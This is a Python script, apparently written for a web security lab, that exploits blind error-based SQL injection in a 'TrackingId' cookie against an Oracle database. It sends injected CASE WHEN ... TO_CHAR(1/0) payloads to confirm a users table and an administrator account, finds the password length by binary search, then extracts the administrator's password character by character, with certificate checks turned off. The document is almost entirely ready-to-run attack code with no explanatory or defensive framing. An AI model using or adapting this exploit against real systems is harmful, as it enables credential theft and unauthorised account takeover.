import requests
import urllib3
import urllib
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) < 4:
    print(f"Usage: python3 {sys.argv[0]} <URL> <TrackingId> <SessionId>")
    sys.exit(1)

def infer(payload: str = '') -> bool:
    if payload != '':
        payload = urllib.parse.quote(payload)
    cookies = {"TrackingId": sys.argv[2] + payload, "session": sys.argv[3]}
    res = requests.get(url=sys.argv[1], cookies=cookies, verify=False)
    return res.status_code == 200

def infer_password_length(maximum_number_chars: int = 30) -> int:
    low = 1
    high = maximum_number_chars
    
    while low <= high:
        mid = (low + high) // 2
        print(f"[*] Testing length: {mid}")
        
        if not infer(f"' || (SELECT CASE WHEN (LENGTH(password) = {mid}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"):
            print(f"[+] Found length: {mid}")
            return mid
        
        if not infer(f"' || (SELECT CASE WHEN (LENGTH(password) < {mid}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"):
            high = mid - 1
        else:
            low = mid + 1
            
    return -1

def infer_password(length: int) -> str:
    password = ""
    print(f"[*] Extracting password ({length} chars)...")
    
    for pos in range(1, length + 1):
        low = 32
        high = 126
        found = False
        
        while low <= high:
            mid = (low + high) // 2
            
            if not infer(f"' || (SELECT CASE WHEN (ASCII(SUBSTR(password,{pos},1)) > {mid}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"):
                low = mid + 1
            else:
                if not infer(f"' || (SELECT CASE WHEN (ASCII(SUBSTR(password,{pos},1)) = {mid}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"):
                    password += chr(mid)
                    print(f"    [+] Current: {password}")
                    found = True
                    break
                else:
                    high = mid - 1
        
        if not found:
            print(f"[!] Warning: Character at position {pos} not found.")
            
    return password

if __name__ == "__main__":
    users_table = infer("' || (SELECT '' FROM users WHERE rownum = 1) || '")
    if users_table:
        print("Users table found")
    
    if not infer("' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"):
        print("Username administrator exists")
    
    password_len = infer_password_length(50)
    
    if password_len != -1:
        final_password = infer_password(password_len)
        print(f"\n[SUCCESS] Administrator password: {final_password}")
    else:
        print("[!] Could not determine password length.")